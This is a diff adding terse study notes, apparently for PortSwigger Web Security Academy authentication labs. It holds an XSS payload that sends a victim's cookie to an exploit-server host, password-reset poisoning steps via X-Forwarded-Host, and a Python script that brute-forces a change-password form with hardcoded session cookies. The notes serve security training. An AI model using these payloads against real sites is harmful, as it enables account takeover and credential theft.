@@ -143,3 +143,72 @@ for password in passwords:
     else:
         print(password[:-1])
 ```
+
+
+## Lab: Offline password cracking
+
+1. XSS to get cookie: `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
+2. `cookie.stay-logged-in = base64(md5(username:password))`
+3. it's a known md5 string
+
+
+## Lab: Password reset broken logic
+
+Change the Username in Password reset request: `/forgot-password`
+
+
+## Lab: Password reset poisoning via middleware
+
+```html
+<button onclick="document.location=''">click here</button>
+
+<a href="https://0af100df042c2592803d2bfb00140084.web-security-academy.net" formaction="/forgot-password?username=wiener%40exploit-0a69000d049325fc801a2a9f01280043.exploit-server.net" formmethod="post">Send POST Request</a>
+```
+
+
+## Lab: Password reset poisoning via middleware
+
+Vulnerability:
+- The victim clicks what ever link received.
+- The `X-Forwared-Host` supported in password reset function.
+
+Bypass:
+- Change `X-Forwared-Host` of password reset function to self-controlled host. Namely, the server will generate a reset link: `https://SELF-CONTROLLED.com?token=xxx`.
+- When the victim click the reset link, the token is stolen.
+
+## Lab: Password brute-force via password change
+
+Brute-force the change-password request, it's not defensed at all.
+
+```python
+import requests
+
+wrong_promp = "Current password is incorrect"
+correct_promp = "New passwords do not match"
+
+url = "https://0a8700a304e421b8806fa3e40073003a.web-security-academy.net/my-account/change-password"
+
+cookies = {
+    "session": "pO3NSh1FpX3KSaFOOmkEuA6cGNqodV84",
+    "session": "I2YwGoKiFc4K6M90y1wvMWLmZhXp9aZm"
+}
+
+# password = "test123"
+
+for password in passwords:
+    data = {
+        "username": "carlos",
+        "current-password": password, 
+        "new-password-1": "test12", 
+        "new-password-2": "test"
+    }
+
+    response = requests.post(url, data=data, cookies=cookies)
+
+    if (wrong_promp in response.text): 
+        print("wrong: ", password)
+    elif (correct_promp in response.text):
+        print("correct: ", password)
+    else:
+        print("something wrong", password)
+```
